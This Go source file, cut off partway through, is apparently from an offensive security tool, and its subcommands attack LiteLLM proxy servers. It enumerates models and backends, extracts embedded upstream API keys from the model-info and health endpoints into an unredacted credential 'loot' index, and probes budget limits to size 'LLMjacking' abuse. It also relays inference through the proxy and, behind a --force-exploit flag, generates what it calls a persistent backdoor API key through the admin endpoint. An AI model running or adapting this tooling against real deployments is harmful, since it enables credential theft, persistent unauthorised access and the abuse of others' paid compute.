package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"github.com/spf13/cobra"

	"github.com/professor-moody/aipostex/internal/inferenceprobe"
	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	openaicompat "github.com/professor-moody/aipostex/pkg/exploit/openaicompat"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	litellmTarget    string
	litellmHeaders   []string
	litellmAPIKey    string
	litellmRelayTest bool
)

var litellmCmd = &cobra.Command{
	Use:   "litellm",
	Short: "Enumerate and exploit LiteLLM proxy servers",
	Long: `Dedicated module for LiteLLM API proxy assessment.

LiteLLM aggregates API keys for multiple LLM providers behind a single proxy.
Compromising a LiteLLM instance often unlocks access to every upstream provider.`,
	Example: strings.Join([]string{
		formatCommandExample("litellm --target http://127.0.0.1:4000 enum"),
		formatCommandExample("litellm --target http://127.0.0.1:4000 config-extract"),
		formatCommandExample("litellm --target http://127.0.0.1:4000 budget-probe"),
		formatCommandExample("litellm --target http://127.0.0.1:4000 proxy-chain"),
	}, "\n"),
}

var litellmEnumCmd = &cobra.Command{
	Use:   "enum",
	Short: "Enumerate models and backend topology",
	Long: `Enumerate the proxy's models and backend topology.

Reads readiness, health, the model list, and model info. LiteLLM sits in front of
real providers, so its model info is where upstream detail concentrates — base
URLs and, in misconfigured deployments, embedded provider credentials, which are
extracted into the credential index.

This is a read-only probing operation.`,
	Example: formatCommandExample("litellm --target http://127.0.0.1:4000 enum"),
	RunE:    runLiteLLMEnum,
}

var litellmConfigExtractCmd = &cobra.Command{
	Use:   "config-extract",
	Short: "Extract configuration keys from health and model-info endpoints",
	Long: `Flatten the per-model litellm_params from the proxy's model-info endpoint.

Those params are the proxy's own configuration: which upstream each alias maps
to, the api_base it calls, and any keys carried alongside. Recovering them turns
an opaque gateway into a documented map of the backends behind it.

This is a read-only probing operation.`,
	Example: formatCommandExample("litellm --target http://127.0.0.1:4000 config-extract"),
	RunE:    runLiteLLMConfigExtract,
}

var litellmBudgetProbeCmd = &cobra.Command{
	Use:   "budget-probe",
	Short: "Enumerate spend limits and usage information",
	Long: `Enumerate spend limits and usage information exposed by the proxy.

Budget, TPM, and RPM fields quantify what an abused key is worth and how much
headroom exists before anyone notices — the practical measure of an LLMjacking
opportunity.

This is a read-only probing operation.`,
	Example: formatCommandExample("litellm --target http://127.0.0.1:4000 budget-probe"),
	RunE:    runLiteLLMBudgetProbe,
}

var litellmProxyChainCmd = &cobra.Command{
	Use:   "proxy-chain",
	Short: "Trace inference through the proxy to identify backend providers",
	Long: `Group the proxy's models by inferred upstream provider, attaching each api_base
where present.

Turns a flat model list into the provider topology behind it: which aliases reach
OpenAI, Anthropic, or a self-hosted backend, and at which addresses. That is the
map you need to know what a stolen proxy key actually grants.

This is a read-only probing operation.`,
	Example: formatCommandExample("litellm --target http://127.0.0.1:4000 proxy-chain"),
	RunE:    runLiteLLMProxyChain,
}

var litellmKeyGenCmd = &cobra.Command{
	Use:         "key-gen",
	Annotations: map[string]string{"aipostex.gated": "true"},
	Short:       "Generate a persistent backdoor API key via the admin API",
	Long: `Attempt to create a new virtual API key through the LiteLLM admin key
generation endpoint. A successful call proves admin-level access and
creates a persistent credential for continued access.

This is a destructive action and requires --force-exploit.`,
	Example: formatCommandExample("litellm --target http://127.0.0.1:4000 key-gen --force-exploit"),
	RunE:    runLiteLLMKeyGen,
}

func init() {
	litellmCmd.PersistentFlags().StringVarP(&litellmTarget, "target", "t", "", "LiteLLM proxy URL (required)")
	litellmCmd.PersistentFlags().StringSliceVar(&litellmHeaders, "header", nil, "Additional HTTP header(s) in 'Key: Value' format")
	litellmCmd.PersistentFlags().StringVar(&litellmAPIKey, "api-key", "", "API key for the LiteLLM proxy")

	litellmProxyChainCmd.Flags().BoolVar(&litellmRelayTest, "relay-test", false, "Send a probe inference to each provider to validate relay reachability")

	litellmCmd.AddCommand(litellmEnumCmd, litellmConfigExtractCmd, litellmBudgetProbeCmd, litellmProxyChainCmd, litellmKeyGenCmd)
}

func newLiteLLMClient() (*openaicompat.Client, error) {
	if strings.TrimSpace(litellmTarget) == "" {
		return nil, missingFlagError("target", formatCommandExample("litellm --target http://127.0.0.1:4000 enum"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(litellmHeaders)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string][]string)
	}
	if strings.TrimSpace(litellmAPIKey) != "" && headers.Get("Authorization") == "" {
		headers.Set("Authorization", "Bearer "+strings.TrimSpace(litellmAPIKey))
	}
	target := normalizeAndWarnTarget(litellmTarget)
	litellmTarget = target
	client, err := openaicompat.NewClient(currentContext(), target, cfg.Timeout, headers)
	if err != nil {
		return nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, err
	}
	client.HTTPClient = httpClient
	return client, nil
}

// newLiteLLMControlClient builds a client that deliberately OMITS any credential
// (strips Authorization, ignores --api-key). It powers the no-credential control
// probe that proves whether an inference endpoint is actually gated.
func newLiteLLMControlClient() (*openaicompat.Client, error) {
	headers, err := exploitcommon.ParseHeaderFlags(litellmHeaders)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string][]string)
	}
	headers.Del("Authorization")
	client, err := openaicompat.NewClient(currentContext(), litellmTarget, cfg.Timeout, headers)
	if err != nil {
		return nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, err
	}
	client.HTTPClient = httpClient
	return client, nil
}

var httpStatusRe = regexp.MustCompile(`\b([1-5]\d{2})\b`)

// httpStatusFromError extracts an HTTP status from an openaicompat error (formatted
// "... unexpected status NNN ..."). Returns "200" for nil, "error" when none present.
func httpStatusFromError(err error) string {
	if err == nil {
		return "200"
	}
	if m := httpStatusRe.FindStringSubmatch(err.Error()); len(m) > 1 {
		return m[1]
	}
	return "error"
}

func runLiteLLMEnum(cmd *cobra.Command, args []string) error {
	client, err := newLiteLLMClient()
	if err != nil {
		return err
	}

	readiness, readErr := client.ReadinessInfo()
	health, healthErr := client.HealthInfo()
	models, modelsErr := client.ListModels()
	modelInfo, modelInfoErr := client.ModelInfo()

	var findings []report.Finding

	if readErr == nil && readiness != nil {
		finding := newExploitFinding(
			report.SourceLiteLLM,
			litellmTarget,
			fmt.Sprintf("LiteLLM proxy identified: v%s", safeLabel(readiness.Version)),
			report.SeverityHigh,
			fmt.Sprintf("LiteLLM proxy v%s is accessible. Status: %s, DB: %s, Cache: %s",
				safeLabel(readiness.Version), safeLabel(readiness.Status), safeLabel(readiness.DB), safeLabel(readiness.Cache)),
			map[string]interface{}{
				"module": "litellm", "action": "enum", "mutating": false,
				"provider": "litellm", "litellm_version": readiness.Version,
				"status": readiness.Status, "db_connected": readiness.DB, "cache_status": readiness.Cache,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "litellm-enum", "readiness")
		finding.Evidence = fmt.Sprintf("version=%s\nstatus=%s\ndb=%s\ncache=%s",
			readiness.Version, readiness.Status, readiness.DB, readiness.Cache)
		findings = append(findings, finding)
	}

	if healthErr == nil && health != nil {
		finding := newExploitFinding(
			report.SourceLiteLLM,
			litellmTarget,
			fmt.Sprintf("LiteLLM health: %d healthy, %d unhealthy endpoint(s)", health.HealthyCount, health.UnhealthyCount),
			report.SeverityInfo,
			fmt.Sprintf("LiteLLM health endpoint reveals backend topology: %d healthy, %d unhealthy", health.HealthyCount, health.UnhealthyCount),
			map[string]interface{}{
				"module": "litellm", "action": "enum", "mutating": false,
				"provider": "litellm", "healthy_count": health.HealthyCount, "unhealthy_count": health.UnhealthyCount,
			},
		)
		finding.Evidence = fmt.Sprintf("healthy=%d unhealthy=%d", health.HealthyCount, health.UnhealthyCount)
		findings = append(findings, finding)
	}

	if modelsErr == nil && len(models) > 0 {
		modelNames := make([]string, 0, len(models))
		for _, m := range models {
			modelNames = append(modelNames, m.ID)
		}
		finding := newExploitFinding(
			report.SourceLiteLLM,
			litellmTarget,
			fmt.Sprintf("LiteLLM exposes %d model(s)", len(models)),
			report.SeverityHigh,
			fmt.Sprintf("LiteLLM proxy exposes %d models: %s", len(models), joinPreview(modelNames, 5)),
			map[string]interface{}{
				"module": "litellm", "action": "enum", "mutating": false,
				"provider": "litellm", "model_count": len(models),
				"models": joinPreview(modelNames, 10),
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "litellm-enum", "models")
		finding.Evidence = strings.Join(modelNames, "\n")
		findings = append(findings, finding)

		infoMap := buildModelInfoProviderMap(modelInfo)
		providers := classifyProvidersWithInfo(modelNames, infoMap)
		if len(providers) > 0 {
			finding := newExploitFinding(
				report.SourceLiteLLM,
				litellmTarget,
				fmt.Sprintf("LiteLLM aggregates %d provider(s)", len(providers)),
				report.SeverityCritical,
				fmt.Sprintf("LiteLLM proxy aggregates API keys for providers: %s. Compromising this proxy unlocks access to all upstream providers.", strings.Join(providers, ", ")),
				map[string]interface{}{
					"module": "litellm", "action": "enum", "mutating": false,
					"provider": "litellm", "provider_count": len(providers), "providers": strings.Join(providers, ", "),
				},
			)
			finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "litellm-enum", "providers")
			finding.Evidence = fmt.Sprintf("providers=%s\ntotal_models=%d",
				strings.Join(providers, ","), len(models))
			findings = append(findings, finding)
		}
	}

	if modelInfoErr == nil && modelInfo != nil && len(modelInfo.Data) > 0 {
		secrets := openaicompat.ExtractLiteLLMSecrets(modelInfo)
		if len(secrets) > 0 {
			finding := newExploitFinding(
				report.SourceLiteLLM,
				litellmTarget,
				fmt.Sprintf("LiteLLM model-info exposes %d credential(s)", len(secrets)),
				report.SeverityCritical,
				fmt.Sprintf("LiteLLM /v1/model/info endpoint exposes %d embedded API key(s) or credential(s) in litellm_params", len(secrets)),
				map[string]interface{}{
					"module": "litellm", "action": "enum", "mutating": false,
					"provider": "litellm", "secret_count": len(secrets),
				},
			)
			finding.Evidence = strings.Join(secrets, "\n")
			finding.Metadata = applyStageLanded(finding.Metadata, "access", "read-confirmed", "litellm-enum", "credentials")
			// Emit the embedded litellm_params keys as structured credentials so the loot index,
			// dossier, and credential-chaining pick them up (same shared helper as ray/mlflow/k8s).
			if creds := litellmSecretCredentials(secrets, litellmTarget); len(creds) > 0 {
				finding.Metadata["extracted_credentials"] = creds
			}
			findings = append(findings, finding)
		}
	}

	if len(findings) == 0 {
		findings = append(findings, newExploitFinding(
			report.SourceLiteLLM, litellmTarget,
			"LiteLLM proxy not detected", report.SeverityInfo,
			"No LiteLLM-specific endpoints responded. Target may not be a LiteLLM proxy.",
			map[string]interface{}{"module": "litellm", "action": "enum", "mutating": false},
		))
	}

	enumPlan := workflowPlan{
		Target:    litellmTarget,
		Stage:     "enum",
		Rationale: "LiteLLM proxy discovery should flow into config extraction and chain analysis.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("litellm --target "+litellmTarget+" config-extract"), "Extract routing configuration (api_base, versions, regions) from model-info.", false, 10),
			newWorkflowRecommendation(formatCommandExample("litellm --target "+litellmTarget+" budget-probe"), "Probe spend limits and usage information.", false, 20),
			newWorkflowRecommendation(formatCommandExample("litellm --target "+litellmTarget+" proxy-chain"), "Trace inference through the proxy to identify backend providers.", false, 30),
		},
	}
	for i := range findings {
		findings[i].Metadata = attachWorkflowToMetadata(findings[i].Metadata, enumPlan)
	}

	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module: "litellm", Action: "enum",
		ResourcesEnumerated: len(findings), Mutating: false,
		WorkflowPlans: []workflowPlan{enumPlan},
	})
}

// litellmSecretCredentials turns the "key=value" secrets ExtractLiteLLMSecrets returns into
// structured credential records (raw values, classified by shape via litellmSecretCredentialType)
// so the loot index, dossier, and credential-chaining pick them up — same shared lootCredentialRecord
// helper as ray/mlflow/k8s. Values are never redacted.
func litellmSecretCredentials(secrets []string, target string) []map[string]interface{} {
	var out []map[string]interface{}
	seen := make(map[string]struct{})
	for _, s := range secrets {
		name, val, ok := strings.Cut(s, "=")
		if !ok {
			continue
		}
		name, val = strings.TrimSpace(name), strings.TrimSpace(val)
		if val == "" {
			continue
		}
		if _, dup := seen[name+"="+val]; dup {
			continue
		}
		seen[name+"="+val] = struct{}{}
		out = append(out, lootCredentialRecord(litellmSecretCredentialType(val), name, val, target, "LiteLLM litellm_params embedded credential")...)
	}
	return out
}

func runLiteLLMConfigExtract(cmd *cobra.Command, args []string) error {
	client, err := newLiteLLMClient()
	if err != nil {
		return err
	}

	var findings []report.Finding

	modelInfo, err := client.ModelInfo()
	if err != nil {
		return fmt.Errorf("querying model-info: %w", err)
	}

	for _, model := range modelInfo.Data {
		modelID, _ := model["model_name"].(string)
		if modelID == "" {
			if id, ok := model["id"].(string); ok {
				modelID = id
			}
		}

		litellmParams, ok := model["litellm_params"].(map[string]interface{})
		if !ok {
			continue
		}

		var configItems []string
		for key, value := range litellmParams {
			strVal := fmt.Sprintf("%v", value)
			configItems = append(configItems, fmt.Sprintf("%s=%s", key, strVal))
		}

		if len(configItems) > 0 {
			finding := newExploitFinding(
				report.SourceLiteLLM,
				litellmTarget,
				fmt.Sprintf("LiteLLM config extracted for model %s", safeLabel(modelID)),
				report.SeverityHigh,
				fmt.Sprintf("Extracted %d configuration parameter(s) for model %s from /v1/model/info", len(configItems), safeLabel(modelID)),
				map[string]interface{}{
					"module": "litellm", "action": "config-extract", "mutating": false,
					"provider": "litellm", "model": modelID, "param_count": len(configItems),
					"litellm_params": true,
				},
			)
			finding.Evidence = strings.Join(configItems, "\n")
			finding.Metadata = applyStageLanded(finding.Metadata, "access", "read-confirmed", "litellm-config-extract", "config")
			findings = append(findings, finding)
		}
	}

	secrets := openaicompat.ExtractLiteLLMSecrets(modelInfo)
	if len(secrets) > 0 {
		finding := newExploitFinding(
			report.SourceLiteLLM,
			litellmTarget,
			fmt.Sprintf("LiteLLM embedded credentials: %d secret(s)", len(secrets)),
			report.SeverityCritical,
			fmt.Sprintf("Recursive scan of /v1/model/info found %d embedded API key(s) or credential(s)", len(secrets)),
			map[string]interface{}{
				"module": "litellm", "action": "config-extract", "mutating": false,
				"provider": "litellm", "secret_count": len(secrets),
			},
		)
		finding.Evidence = strings.Join(secrets, "\n")
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "read-confirmed", "litellm-config-extract", "credentials")
		findings = append(findings, finding)
	}

	health, healthErr := client.HealthInfo()
	if healthErr == nil && health != nil {
		healthSecrets := extractHealthSecrets(health)
		if len(healthSecrets) > 0 {
			finding := newExploitFinding(
				report.SourceLiteLLM,
				litellmTarget,
				fmt.Sprintf("LiteLLM health endpoint exposes %d config value(s)", len(healthSecrets)),
				report.SeverityHigh,
				fmt.Sprintf("LiteLLM /health endpoint reveals backend configuration for %d endpoint(s)", len(healthSecrets)),
				map[string]interface{}{
					"module": "litellm", "action": "config-extract", "mutating": false,
					"provider": "litellm", "health_secret_count": len(healthSecrets),
				},
			)
			finding.Evidence = strings.Join(healthSecrets, "\n")
			finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "litellm-config-extract", "health")
			findings = append(findings, finding)
		}
	}

	if len(findings) == 0 {
		findings = append(findings, newExploitFinding(
			report.SourceLiteLLM, litellmTarget,
			"No LiteLLM configuration extracted", report.SeverityInfo,
			"Model-info endpoint returned no extractable litellm_params.",
			map[string]interface{}{"module": "litellm", "action": "config-extract", "mutating": false},
		))
	}

	plan := buildLiteLLMExploitWorkflowPlan(litellmTarget, "config-extract", "")
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, plan)

	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module: "litellm", Action: "config-extract",
		ResourcesEnumerated: len(findings), Mutating: false,
		WorkflowPlans: []workflowPlan{plan},
	})
}

func extractHealthSecrets(health *openaicompat.LiteLLMHealthResponse) []string {
	var secrets []string
	seen := make(map[string]struct{})
	for _, ep := range health.HealthyEndpoints {
		openaicompat.ExtractSecretsFromMap(ep, &secrets, seen, 0)
	}
	for _, ep := range health.UnhealthyEndpoints {
		openaicompat.ExtractSecretsFromMap(ep, &secrets, seen, 0)
	}
	return secrets
}

func runLiteLLMBudgetProbe(cmd *cobra.Command, args []string) error {
	client, err := newLiteLLMClient()
	if err != nil {
		return err
	}

	var findings []report.Finding

	modelInfo, err := client.ModelInfo()
	if err != nil {
		warnf("model-info: %v", err)
	}

	if modelInfo != nil {
		for _, model := range modelInfo.Data {
			modelID, _ := model["model_name"].(string)
			if modelID == "" {
				if id, ok := model["id"].(string); ok {
					modelID = id
				}
			}

			budgetFields := map[string]interface{}{}
			for _, key := range []string{"max_budget", "budget_duration", "tpm", "rpm", "max_tokens", "input_cost_per_token", "output_cost_per_token"} {
				if v, ok := model[key]; ok && v != nil {
					budgetFields[key] = v
				}
			}
			if params, ok := model["litellm_params"].(map[string]interface{}); ok {
				for _, key := range []string{"max_budget", "budget_duration", "tpm_limit", "rpm_limit"} {
					if v, ok := params[key]; ok && v != nil {
						budgetFields["litellm_params."+key] = v
					}
				}
			}

			if len(budgetFields) > 0 {
				var items []string
				for k, v := range budgetFields {
					items = append(items, fmt.Sprintf("%s=%v", k, v))
				}
				finding := newExploitFinding(
					report.SourceLiteLLM,
					litellmTarget,
					fmt.Sprintf("LiteLLM budget data exposed for %s", safeLabel(modelID)),
					report.SeverityMedium,
					fmt.Sprintf("Budget/rate-limit fields exposed for model %s: %s", safeLabel(modelID), strings.Join(items, ", ")),
					map[string]interface{}{
						"module": "litellm", "action": "budget-probe", "mutating": false,
						"provider": "litellm", "model": modelID, "budget_fields": len(budgetFields),
					},
				)
				finding.Evidence = strings.Join(items, "\n")
				finding.Metadata = applyStageLanded(finding.Metadata, "recon", "read-confirmed", "litellm-budget-probe", "budget")
				findings = append(findings, finding)
			}
		}
	}

	if len(findings) == 0 {
		noFinding := newExploitFinding(
			report.SourceLiteLLM, litellmTarget,
			"No LiteLLM budget data found", report.SeverityInfo,
			"No budget or rate-limit fields were exposed in model-info.",
			map[string]interface{}{"module": "litellm", "action": "budget-probe", "mutating": false},
		)
		noFinding.Metadata = applyStageLanded(noFinding.Metadata, "recon", "inconclusive", "litellm-budget-probe", "budget")
		findings = append(findings, noFinding)
	}

	plan := buildLiteLLMExploitWorkflowPlan(litellmTarget, "budget-probe", "")
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, plan)

	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module: "litellm", Action: "budget-probe",
		ResourcesEnumerated: len(findings), Mutating: false,
		WorkflowPlans: []workflowPlan{plan},
	})
}

func runLiteLLMProxyChain(cmd *cobra.Command, args []string) error {
	client, err := newLiteLLMClient()
	if err != nil {
		return err
	}

	models, modelsErr := client.ListModels()
	if modelsErr != nil {
		return fmt.Errorf("enumerating models: %w", modelsErr)
	}

	modelInfo, _ := client.ModelInfo()
	infoMap := buildModelInfoProviderMap(modelInfo)

	providers := classifyProvidersWithInfo(modelIDs(models), infoMap)
	providerModels := make(map[string][]string)

	for _, m := range models {
		provider := classifyModelWithInfo(m.ID, infoMap)
		providerModels[provider] = append(providerModels[provider], m.ID)
	}

	var findings []report.Finding

	for provider, providerModelList := range providerModels {
		finding := newExploitFinding(
			report.SourceLiteLLM,
			litellmTarget,
			fmt.Sprintf("LiteLLM proxy chain: %s (%d model(s))", provider, len(providerModelList)),
			report.SeverityHigh,
			fmt.Sprintf("LiteLLM proxies %d model(s) to %s backend: %s", len(providerModelList), provider, joinPreview(providerModelList, 5)),
			map[string]interface{}{
				"module": "litellm", "action": "proxy-chain", "mutating": false,
				"provider": provider, "model_count": len(providerModelList),
				"models": joinPreview(providerModelList, 10),
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "impact", "confirmed", "litellm-proxy-chain", "provider")

		if modelInfo != nil {
			for _, info := range modelInfo.Data {
				name, _ := info["model_name"].(string)
				for _, pm := range providerModelList {
					if name == pm {
						if params, ok := info["litellm_params"].(map[string]interface{}); ok {
							if apiBase, ok := params["api_base"].(string); ok {
								finding.Metadata["api_base"] = apiBase
							}
						}
						break
					}
				}
			}
		}

		apiBase, _ := finding.Metadata["api_base"].(string)
		finding.Evidence = fmt.Sprintf("provider=%s\nmodel_count=%d\napi_base=%s\nmodels=%s",
			provider, len(providerModelList), apiBase, strings.Join(providerModelList, ","))
		findings = append(findings, finding)
	}

	if len(providers) > 1 {
		finding := newExploitFinding(
			report.SourceLiteLLM,
			litellmTarget,
			fmt.Sprintf("LiteLLM multi-provider aggregation: %s", strings.Join(providers, ", ")),
			report.SeverityCritical,
			fmt.Sprintf("LiteLLM proxy aggregates %d providers (%s) behind a single endpoint. Compromise of this proxy unlocks access to all upstream API keys and compute.",
				len(providers), strings.Join(providers, ", ")),
			map[string]interface{}{
				"module": "litellm", "action": "proxy-chain", "mutating": false,
				"provider_count": len(providers), "providers": strings.Join(providers, ", "),
				"total_models": len(models),
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "impact", "confirmed", "litellm-proxy-chain", "aggregation")
		finding.Evidence = fmt.Sprintf("providers=%s\nprovider_count=%d\ntotal_models=%d",
			strings.Join(providers, ","), len(providers), len(models))
		findings = append(findings, finding)
	}

	if len(findings) == 0 {
		findings = append(findings, newExploitFinding(
			report.SourceLiteLLM, litellmTarget,
			"LiteLLM proxy chain: no models found", report.SeverityInfo,
			"No models were returned from the LiteLLM proxy.",
			map[string]interface{}{"module": "litellm", "action": "proxy-chain", "mutating": false},
		))
	}

	// D4: relay-test — send probe inference to one model per provider
	var relayFailures int
	if litellmRelayTest && len(providerModels) > 0 {
		controlClient, controlErr := newLiteLLMControlClient()
		if controlErr != nil {
			controlClient = nil
		}
		for provider, providerModelList := range providerModels {
			if len(providerModelList) == 0 {
				continue
			}
			testModel := providerModelList[0]
			infof("[relay-test] probing %s via model %s", provider, testModel)
			probeResult, probeErr := client.ProxyTest(testModel)
			if probeErr != nil {
				relayFailures++
				finding := newExploitFinding(
					report.SourceLiteLLM,
					litellmTarget,
					fmt.Sprintf("LiteLLM relay unreachable: %s", provider),
					report.SeverityMedium,
					fmt.Sprintf("Relay probe to %s via model %s failed: %v", provider, testModel, probeErr),
					map[string]interface{}{
						"module": "litellm", "action": "proxy-chain", "mutating": false,
						"provider": provider, "test_model": testModel,
						"relay_test": true, "reachable": false,
					},
				)
				finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "litellm-relay-test", provider)
				findings = append(findings, finding)
				continue
			}
			severity := report.SeverityCritical
			if !probeResult.Coherent {
				severity = report.SeverityHigh
			}
			finding := newExploitFinding(
				report.SourceLiteLLM,
				litellmTarget,
				fmt.Sprintf("LiteLLM relay confirmed: %s", provider),
				severity,
				fmt.Sprintf("Relay probe to %s via model %s succeeded (coherent=%t, latency=%s)",
					provider, testModel, probeResult.Coherent, probeResult.Latency),
				map[string]interface{}{
					"module": "litellm", "action": "proxy-chain", "mutating": false,
					"provider": provider, "test_model": testModel,
					"relay_test": true, "reachable": true,
					"coherent": probeResult.Coherent, "latency_ms": probeResult.Latency.Milliseconds(),
					"coherence_score": probeResult.CoherenceScore,
				},
			)
			// No-credential control probe: a real-inference claim is only honest if the SAME
			// model/provider path is REJECTED without the credential. If the no-cred probe itself
			// returns coherent output, the gate isn't real (anti-fake-win) and credential_gated stays false.
			authControlStatus := "skipped"
			credentialGated := false
			if controlClient != nil && probeResult.Coherent {
				if _, noCredErr := controlClient.ProxyTest(testModel); noCredErr != nil {
					authControlStatus = httpStatusFromError(noCredErr)
					credentialGated = authControlStatus == "401" || authControlStatus == "403"
				} else {
					authControlStatus = "200" // no-cred succeeded -> endpoint not gated
				}
			}
			finding.Metadata["credential_gated"] = credentialGated
			finding.Metadata["auth_control_status"] = authControlStatus
			// Inference reality probe through the relay: coherence + a no-cred control are necessary
			// but not sufficient — a coherent-but-CANNED relay stays influenced. Only input-dependent
			// output through the relay earns execution-confirmed.
			relayLanded := "influenced"
			relayProbe := inferenceprobe.Verify([]byte("aipostex relay reality probe"), func(input []byte) (string, int, error) {
				r, e := client.Generate(testModel, string(input), 32)
				return r.Response, r.StatusCode, e
			})
			finding.Metadata["inference_input_dependent"] = relayProbe.Real
			if relayProbe.Real {
				relayLanded = "execution-confirmed"
			}
			finding.Evidence = fmt.Sprintf("provider=%s\nmodel=%s\ncoherent=%t\nlatency=%s\ncredential_gated=%t\nauth_control_status=%s\ninput_dependent=%t\nresponse=%s",
				provider, testModel, probeResult.Coherent, probeResult.Latency, credentialGated, authControlStatus, relayProbe.Real, probeResult.Response)
			finding.Metadata = applyStageLanded(finding.Metadata, "impact", relayLanded, "litellm-relay-test", provider)
			findings = append(findings, finding)
		}
	}

	plan := buildLiteLLMExploitWorkflowPlan(litellmTarget, "proxy-chain", "")
	var plans []workflowPlan
	if len(findings) > 0 {
		findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, plan)
		plans = []workflowPlan{plan}
	}

	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module: "litellm", Action: "proxy-chain",
		ResourcesEnumerated: len(findings), PartialFailures: relayFailures, Mutating: false,
		WorkflowPlans: plans,
	})
}

func classifyProviders(modelNames []string) []string {
	return classifyProvidersWithInfo(modelNames, nil)
}

func classifyProvidersWithInfo(modelNames []string, infoMap map[string]string) []string {
	seen := make(map[string]bool)
	var providers []string
	for _, name := range modelNames {
		p := classifyModelWithInfo(name, infoMap)
		if !seen[p] {
			seen[p] = true
			providers = append(providers, p)
		}
	}
	return providers
}

// classifyModelWithInfo prefers provider attribution from /v1/model/info
// backend metadata, falling back to alias-based heuristics.
func classifyModelWithInfo(alias string, infoMap map[string]string) string {
	if infoMap != nil {
		if provider, ok := infoMap[alias]; ok && provider != "unknown" {
			return provider
		}
	}
	return classifyModel(alias)
}

// buildModelInfoProviderMap extracts upstream provider for each model alias
// from /v1/model/info litellm_params fields (model name and api_base).
func buildModelInfoProviderMap(info *openaicompat.LiteLLMModelInfoResponse) map[string]string {
	if info == nil || len(info.Data) == 0 {
		return nil
	}
	m := make(map[string]string, len(info.Data))
	for _, entry := range info.Data {
		alias, _ := entry["model_name"].(string)
		if alias == "" {
			continue
		}
		params, _ := entry["litellm_params"].(map[string]interface{})
		if params == nil {
			continue
		}
		if upstreamModel, ok := params["model"].(string); ok && upstreamModel != "" {
			if p := classifyModel(upstreamModel); p != "unknown" {
				m[alias] = p
				continue
			}
		}
		if apiBase, ok := params["api_base"].(string); ok {
			if p := classifyProviderFromAPIBase(apiBase); p != "unknown" {
				m[alias] = p
				continue
			}
		}
	}
	return m
}

func classifyProviderFromAPIBase(apiBase string) string {
	lower := strings.ToLower(apiBase)
	switch {
	case strings.Contains(lower, "openai.com"):
		return "openai"
	case strings.Contains(lower, "anthropic.com"):
		return "anthropic"
	case strings.Contains(lower, "googleapis.com") || strings.Contains(lower, "vertex"):
		return "google"
	case strings.Contains(lower, "azure.com") || strings.Contains(lower, "openai.azure"):
		return "azure"
	case strings.Contains(lower, "amazonaws.com") || strings.Contains(lower, "bedrock") || strings.Contains(lower, "sagemaker"):
		return "aws"
	case strings.Contains(lower, "cohere.com") || strings.Contains(lower, "cohere.ai"):
		return "cohere"
	case strings.Contains(lower, "huggingface.co"):
		return "huggingface"
	default:
		return "unknown"
	}
}

func classifyModel(name string) string {
	lower := strings.ToLower(name)
	switch {
	case strings.HasPrefix(lower, "azure/"):
		return "azure"
	case strings.HasPrefix(lower, "bedrock/") || strings.HasPrefix(lower, "sagemaker/"):
		return "aws"
	case strings.HasPrefix(lower, "vertex_ai/") || strings.HasPrefix(lower, "google/"):
		return "google"
	case strings.HasPrefix(lower, "anthropic/") || strings.Contains(lower, "claude"):
		return "anthropic"
	case strings.HasPrefix(lower, "openai/") || strings.HasPrefix(lower, "o1") || strings.HasPrefix(lower, "o3") || strings.HasPrefix(lower, "o4") || strings.Contains(lower, "gpt"):
		return "openai"
	case strings.Contains(lower, "gemini"):
		return "google"
	case strings.Contains(lower, "llama") || strings.Contains(lower, "mistral") || strings.Contains(lower, "mixtral") || strings.Contains(lower, "codellama") || strings.HasPrefix(lower, "ollama/"):
		return "ollama/local"
	case strings.Contains(lower, "command") || strings.HasPrefix(lower, "cohere/"):
		return "cohere"
	case strings.HasPrefix(lower, "huggingface/"):
		return "huggingface"
	default:
		return "unknown"
	}
}

func modelIDs(models []openaicompat.ModelInfo) []string {
	ids := make([]string, 0, len(models))
	for _, m := range models {
		ids = append(ids, m.ID)
	}
	return ids
}

func runLiteLLMKeyGen(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("litellm key-gen"); err != nil {
		return err
	}
	if strings.TrimSpace(litellmTarget) == "" {
		return missingFlagError("target", formatCommandExample("litellm --target http://127.0.0.1:4000 key-gen --force-exploit"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(litellmHeaders)
	if err != nil {
		return err
	}
	if headers == nil {
		headers = make(http.Header)
	}
	if strings.TrimSpace(litellmAPIKey) != "" && headers.Get("Authorization") == "" {
		headers.Set("Authorization", "Bearer "+strings.TrimSpace(litellmAPIKey))
	}
	target := normalizeAndWarnTarget(litellmTarget)
	litellmTarget = target

	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return err
	}

	payload := map[string]interface{}{
		"key_alias":  "aipostex-proof",
		"max_budget": 0.01,
		"duration":   "1h",
		"metadata":   map[string]string{"source": "aipostex", "purpose": "security-assessment"},
	}

	var response map[string]interface{}
	body, statusCode, postErr := exploitcommon.DoJSONWithContext(
		currentContext(), httpClient, http.MethodPost,
		target+"/key/generate", headers, payload, &response,
	)

	if postErr != nil || statusCode < 200 || statusCode >= 300 {
		// Fallback to the /key/new endpoint used in some versions.
		body, statusCode, postErr = exploitcommon.DoJSONWithContext(
			currentContext(), httpClient, http.MethodPost,
